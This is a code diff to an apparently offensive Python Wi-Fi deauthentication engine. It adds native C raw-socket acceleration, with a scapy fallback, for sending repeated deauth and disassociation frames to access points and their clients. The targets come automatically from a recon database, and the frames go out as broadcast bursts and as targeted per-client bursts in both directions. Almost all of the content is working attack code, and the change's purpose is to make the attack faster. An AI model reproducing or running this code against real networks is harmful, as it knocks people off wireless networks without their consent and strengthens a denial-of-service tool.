@@ -7,6 +7,9 @@ Sends targeted deauth/disassoc frames in three directions:
   3. AP -> Broadcast (mass disconnect)
 
 Targets are populated from the recon database — no manual input needed.
+
+Performance: uses native C packet crafting/sending when available,
+falls back to scapy sendp() if the native module is not compiled.
 """
 
 import time
@@ -19,6 +22,18 @@ from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, RadioTap
 from .config import (
     DEAUTH_BURST_COUNT, DEAUTH_BURST_INTERVAL, WIFI_BROADCAST, log,
 )
+
+# ─── Native C acceleration (optional) ────────────────────────────────────────
+try:
+    from .native.packet_engine import RawSocket
+    from .native.deauth_craft import (
+        craft_deauth, craft_disassoc, deauth_target, deauth_broadcast,
+    )
+    _HAS_NATIVE = True
+    log.debug("Deauth engine: native C acceleration loaded")
+except ImportError:
+    _HAS_NATIVE = False
+    log.debug("Deauth engine: native C not available, using scapy fallback")
 
 
 class DeauthEngine:
@@ -80,43 +95,89 @@ class DeauthEngine:
         )
         return [deauth, disassoc]
 
+    def _send_native(self, raw_sock, sender, receiver, bssid, count):
+        """Send deauth + disassoc burst using native C raw socket."""
+        for _ in range(count):
+            deauth_frame = craft_deauth(sender, receiver, bssid, reason=7)
+            disassoc_frame = craft_disassoc(sender, receiver, bssid, reason=8)
+            raw_sock.send(deauth_frame)
+            raw_sock.send(disassoc_frame)
+
     def _deauth_loop(self):
+        # Open native raw socket if available
+        raw_sock = None
+        if _HAS_NATIVE:
+            try:
+                raw_sock = RawSocket(self.interface)
+                log.info("Deauth engine: using native C raw socket")
+            except Exception as e:
+                log.warning(f"Native raw socket failed ({e}), falling back to scapy")
+                raw_sock = None
+
         while self.running:
             try:
                 for bssid, clients in list(self._targets.items()):
-                    # Broadcast deauth (hits all clients)
-                    for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
+                    if raw_sock:
+                        # ── Native C fast path ──
+                        # Broadcast deauth
                         try:
-                            sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                                  inter=0.02, verbose=False)
+                            deauth_broadcast(raw_sock, bssid, DEAUTH_BURST_COUNT)
                         except Exception as e:
-                            log.error(f"Deauth send failed for {bssid}: {e}")
-                    # Per-client targeted deauth (3-way)
-                    for client_mac in list(clients):
-                        for frame in self._craft_deauth(bssid, client_mac, bssid):
+                            log.error(f"Native broadcast deauth failed for {bssid}: {e}")
+                        # Per-client targeted (both directions)
+                        for client_mac in list(clients):
+                            try:
+                                deauth_target(raw_sock, bssid, client_mac, DEAUTH_BURST_COUNT)
+                            except Exception as e:
+                                log.error(f"Native deauth failed for {client_mac}: {e}")
+                            # Optionally verify deauth effectiveness
+                            if self.verify_callback:
+                                try:
+                                    self.verify_callback(bssid, client_mac)
+                                except Exception as e:
+                                    log.debug(f"Deauth verify callback error: {e}")
+                    else:
+                        # ── Scapy fallback path ──
+                        # Broadcast deauth (hits all clients)
+                        for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
                             try:
                                 sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
                                       inter=0.02, verbose=False)
                             except Exception as e:
-                                log.error(f"Deauth send failed for {client_mac}: {e}")
-                        for frame in self._craft_deauth(client_mac, bssid, bssid):
-                            try:
-                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                                      inter=0.02, verbose=False)
-                            except Exception as e:
-                                log.error(f"Deauth send failed for {client_mac} -> AP: {e}")
-                        # Optionally verify deauth effectiveness
-                        if self.verify_callback:
-                            try:
-                                self.verify_callback(bssid, client_mac)
-                            except Exception as e:
-                                log.debug(f"Deauth verify callback error: {e}")
+                                log.error(f"Deauth send failed for {bssid}: {e}")
+                        # Per-client targeted deauth (3-way)
+                        for client_mac in list(clients):
+                            for frame in self._craft_deauth(bssid, client_mac, bssid):
+                                try:
+                                    sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
+                                          inter=0.02, verbose=False)
+                                except Exception as e:
+                                    log.error(f"Deauth send failed for {client_mac}: {e}")
+                            for frame in self._craft_deauth(client_mac, bssid, bssid):
+                                try:
+                                    sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
+                                          inter=0.02, verbose=False)
+                                except Exception as e:
+                                    log.error(f"Deauth send failed for {client_mac} -> AP: {e}")
+                            # Optionally verify deauth effectiveness
+                            if self.verify_callback:
+                                try:
+                                    self.verify_callback(bssid, client_mac)
+                                except Exception as e:
+                                    log.debug(f"Deauth verify callback error: {e}")
                 time.sleep(DEAUTH_BURST_INTERVAL)
             except Exception as e:
                 log.error(f"Deauth loop error: {e}")
                 if not self.running:
                     break
                 time.sleep(1)  # Prevent tight error loop
+
+        # Cleanup native socket
+        if raw_sock:
+            try:
+                raw_sock.close()
+            except Exception:
+                pass
 
     def start(self):
         if self.running:
